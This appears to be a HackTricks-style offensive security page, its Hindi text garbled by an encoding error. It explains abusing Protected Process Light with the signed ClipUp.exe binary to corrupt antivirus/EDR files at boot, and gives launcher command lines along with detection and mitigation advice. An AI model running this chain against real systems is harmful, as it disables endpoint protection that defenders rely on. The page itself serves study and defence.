## Protected Process Light (PPL) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ AV/EDR рдХреЗ рд╕рд╛рде LOLBINs рд╕реЗ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝

Protected Process Light (PPL) рдПрдХ signer/level hierarchy рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рд╕рдорд╛рди-рдпрд╛-рдКрдБрдЪреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣реА рдПрдХ-рджреВрд╕рд░реЗ рдХреЛ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХреЗрдВред рдЖрдХреНрд░рд╛рдордХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдпрджрд┐ рдЖрдк рд╡реИрдз рд░реВрдк рд╕реЗ рдПрдХ PPL-enabled рдмрд╛рдЗрдирд░реА рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдЙрд╕рдХреЗ arguments рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВ, рддреЛ рдЖрдк рдмреЗрдирд┐рдЧреНрди рдлрд╝рдВрдХреНрд╢рдирд▓рд┐рдЯреА (рдЙрджрд╛., logging) рдХреЛ рдПрдХ рд╕реАрдорд┐рдд, PPL-backed write primitive рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ AV/EDR рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд╛рдо рдХрд░реЗред

рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ PPL рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрдпрд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ
- рд▓рдХреНрд╖реНрдп EXE (рдФрд░ рдХреЛрдИ рднреА рд▓реЛрдбреЗрдб DLLs) рдХреЛ PPL-capable EKU рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ CreateProcess рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдореНрди flags рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`ред
- рдПрдХ рд╕рдВрдЧрдд protection level рдЕрдиреБрд░реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреЗ signer рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реЛ (рдЙрджрд╛., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` anti-malware signers рдХреЗ рд▓рд┐рдП, `PROTECTION_LEVEL_WINDOWS` Windows signers рдХреЗ рд▓рд┐рдП)ред рдЧрд▓рдд рд╕реНрддрд░ creation рдкрд░ рдЕрд╕рдлрд▓ рд╣реЛрдЧрд╛ред

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

рд▓реЙрдиреНрдЪрд░ рдЯреВрд▓рд┐рдВрдЧ
- рдУрдкрди-рд╕реЛрд░реНрд╕ рд╣реЗрд▓реНрдкрд░: CreateProcessAsPPL (protection level рдЪреБрдирддрд╛ рд╣реИ рдФрд░ arguments рдХреЛ рд▓рдХреНрд╖реНрдп EXE рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИ):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- рдЙрдкрдпреЛрдЧ рдкреИрдЯрд░реНрди:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN рдкреНрд░рд┐рдорд┐рдЯрд┐рд╡: ClipUp.exe
- рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╕рд┐рд╕реНрдЯрдо рдмрд╛рдЗрдирд░реА `C:\Windows\System32\ClipUp.exe` рд╕реНрд╡рдпрдВ-рд╕реНрдкреЙрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓рд░-рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрд╛рде рдкрд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ.
- рдЬрдм рдЗрд╕реЗ PPL рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдирд╛ PPL рдмреИрдХрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИ.
- ClipUp рд╕реНрдкреЗрд╕ рд╡рд╛рд▓реЗ рдкрд╛рдереНрд╕ рдХреЛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛; рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд╕рдВрд░рдХреНрд╖рд┐рдд рд▓реЛрдХреЗрд╢рдиреЛрдВ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 8.3 short paths рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ.

8.3 short path рд╕рд╣рд╛рдпрдХ
- рд╢реЙрд░реНрдЯ рдирд╛рдо рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ: `dir /x` рдкреНрд░рддреНрдпреЗрдХ parent directory рдореЗрдВ.
- cmd рдореЗрдВ рд╢реЙрд░реНрдЯ рдкрд╛рде рдирд┐рдХрд╛рд▓реЗрдВ: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) рдХреЛ `CREATE_PROTECTED_PROCESS` рдХреЗ рд╕рд╛рде рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ, рдХрд┐рд╕реА launcher (рдЙрджрд╛., CreateProcessAsPPL) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП.
2) ClipUp рдХреЛ log-path рдЖрд░реНрдЧреБрдореЗрдВрдЯ рдкрд╛рд╕ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ рдкреНрд░реЛрдЯреЗрдХреНрдЯреЗрдб AV рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА (рдЙрджрд╛., Defender Platform) рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХреЗред рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░ 8.3 short names рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ.
3) рдпрджрд┐ target рдмрд╛рдЗрдирд░реА рдЖрдорддреМрд░ рдкрд░ AV рджреНрд╡рд╛рд░рд╛ рд░рди рдХрд░рддреЗ рд╕рдордп рдЦреБрд▓реА/рд▓реЙрдХ рд░рд╣рддреА рд╣реИ (рдЙрджрд╛., MsMpEng.exe), рддреЛ AV рд╢реБрд░реВ рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдмреВрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ auto-start service рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ рд╢реЗрдбреНрдпреВрд▓ рдХрд░реЗрдВ рдЬреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд░реВрдк рд╕реЗ рдкрд╣рд▓реЗ рдЪрд▓реЗред Process Monitor (boot logging) рдХреЗ рд╕рд╛рде рдмреВрдЯ рдСрд░реНрдбрд░рд┐рдВрдЧ рд╡реИрд▓рд┐рдбреЗрдЯ рдХрд░реЗрдВ.
4) рд░рд┐рдмреВрдЯ рдкрд░ PPL-backed write AV рджреНрд╡рд╛рд░рд╛ рдмрд╛рдЗрдирд░рд┐рдпреЛрдВ рдХреЛ рд▓реЙрдХ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ target рдлрд╝рд╛рдЗрд▓ рдХрд░рдкреНрдЯ рд╣реЛ рдЬрд╛рддреА рд╣реИ рдФрд░ startup рд░реЛрдХ рдЬрд╛рддрд╛ рд╣реИ.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
рдиреЛрдЯреНрд╕ рдФрд░ рд╕реАрдорд╛рдПрдБ
- рдЖрдк ClipUp рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реНрдерд╛рди рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ; рдпрд╣ primitive рд╕рдЯреАрдХ рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рднреНрд░рд╖реНрдЯрд╛рдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред
- рд╕реЗрд╡рд╛ install/start рдХрд░рдиреЗ рдФрд░ рд░реАрдмреВрдЯ рд╡рд┐рдВрдбреЛ рдХреЗ рд▓рд┐рдП local admin/SYSTEM рдЖрд╡рд╢реНрдпрдХ рд╣реИред
- рд╕рдордп рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ: рд▓рдХреНрд╖реНрдп рдЦреБрд▓рд╛ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП; рдмреВрдЯ-рдЯрд╛рдЗрдо рдирд┐рд╖реНрдкрд╛рджрди рдлрд╛рдЗрд▓ рд▓реЙрдХ рд╕реЗ рдмрдЪрд╛рддрд╛ рд╣реИред

рдбрд┐рдЯреЗрдХреНрд╢рди
- `ClipUp.exe` рдХреЗ рдЕрд╕рд╛рдорд╛рдиреНрдп arguments рдХреЗ рд╕рд╛рде рдкреНрд░реЛрд╕реЗрд╕ рдмрдирдирд╛, рд╡рд┐рд╢реЗрд╖рдХрд░ рдЬрдм рдЗрд╕рдХрд╛ parent non-standard launchers рд╣реЛ рдФрд░ рдпрд╣ рдмреВрдЯ рдХреЗ рджреМрд░рд╛рди/рдЖрд╕рдкрд╛рд╕ рд╣реЛред
- рдирдИ рд╕реЗрд╡рд╛рдПрдБ рдЬреЛ auto-start рдХреЗ рд▓рд┐рдП рд╕рдВрджрд┐рдЧреНрдз binaries рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреА рд╣реИрдВ рдФрд░ рд▓рдЧрд╛рддрд╛рд░ Defender/AV рд╕реЗ рдкрд╣рд▓реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВред Defender рдХреЗ startup рд╡рд┐рдлрд▓рддрд╛рдУрдВ рд╕реЗ рдкрд╣рд▓реЗ рдХреА service creation/modification рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред
- Defender binaries/Platform рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдкрд░ file integrity monitoring; protected-process flags рд╡рд╛рд▓реЗ рдкреНрд░реЛрд╕реЗрд╕реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдлрд╛рдЗрд▓ рдирд┐рд░реНрдорд╛рдг/рдкрд░рд┐рд╡рд░реНрддрдиред
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` рдХреЗ рд╕рд╛рде рдмрдирд╛рдП рдЧрдП рдкреНрд░реЛрд╕реЗрд╕ рдФрд░ non-AV binaries рджреНрд╡рд╛рд░рд╛ рдЕрд╕рд╛рдорд╛рдиреНрдп PPL рд╕реНрддрд░ рдХреЗ рдЙрдкрдпреЛрдЧ рдкрд░ рдирдЬрд╝рд░ рд░рдЦреЗрдВред

рдирд┐рд╡рд╛рд░рдг
- WDAC/Code Integrity: рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреМрди рд╕реЗ signed binaries PPL рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ рдХрд┐рди parent рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдЪрд▓ рд╕рдХрддреЗ рд╣реИрдВ; legitimate contexts рдХреЗ рдмрд╛рд╣рд░ ClipUp рдХреЗ invocation рдХреЛ рдмреНрд▓реЙрдХ рдХрд░реЗрдВред
- Service hygiene: auto-start рд╕реЗрд╡рд╛рдУрдВ рдХреА creation/modification рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдФрд░ start-order рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВред
- рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдХрд┐ Defender tamper protection рдФрд░ early-launch protections рд╕рдХреНрд╖рдо рд╣реИрдВ; binary corruption рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ startup errors рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
- рдпрджрд┐ рдЖрдкрдХреА рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде compatible рд╣реЛ рддреЛ security tooling рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реЙрд▓реНрдпреВрдореНрд╕ рдкрд░ 8.3 short-name generation рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ (рдкреВрд░реА рддрд░рд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ)ред

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## рд╕рдВрджрд░реНрдн

- [Unit42 тАУ New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv тАУ Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research тАУ Before ToolShell: Exploring Storm-2603тАЩs Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn тАУ DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs тАУ Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft тАУ Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft тАУ EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals тАУ Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium тАУ Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research тАУ Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
